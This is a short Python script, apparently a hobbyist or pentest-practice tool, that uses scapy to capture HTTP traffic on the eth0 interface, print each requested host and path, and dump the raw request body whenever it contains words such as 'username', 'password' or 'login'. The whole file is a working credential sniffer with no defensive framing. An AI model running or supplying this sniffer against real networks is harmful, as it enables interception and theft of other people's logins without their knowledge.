from scapy.all import *
from scapy.layers import http


KEYWORDS = ['username', 'password', 'login', 'pass', 'user']

def http_sniffer(packet):
	if packet.haslayer(http.HTTPRequest):
		request = packet.getlayer(http.HTTPRequest)

		url = request.Host + request.Path
		print('HTTP website: ' + url.decode())

		if packet.haslayer(Raw):
			payload = packet.getlayer(Raw).load.decode()

			for kw in KEYWORDS:
				if kw in payload:
					print('---POTENTIAL CREDENTIALS DETECTED----')
					print(payload)
					print('-------------------------------------')
					break

if __name__ == '__main__':
	conf.iface = 'eth0'

	sniff(prn=http_sniffer)
